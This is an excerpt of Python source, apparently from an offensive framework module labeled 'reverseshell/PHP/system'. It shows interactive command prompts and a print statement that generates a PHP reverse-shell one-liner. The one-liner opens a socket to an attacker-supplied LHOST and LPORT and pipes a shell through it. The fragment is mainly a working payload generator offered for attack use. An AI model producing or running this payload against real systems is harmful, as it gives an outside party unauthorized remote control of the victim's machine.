...
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mreverseshell/PHP/system\033[1;34m) > \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mreverseshell/PHP/system\033[1;31m)> \033[1;32m")
...
time.sleep(1)
print(f"""
\033[1;32mphp -r '$sock=fsockopen("{LHOST}",{LPORT});system("sh <&3 >&3 2>&3");'
""")
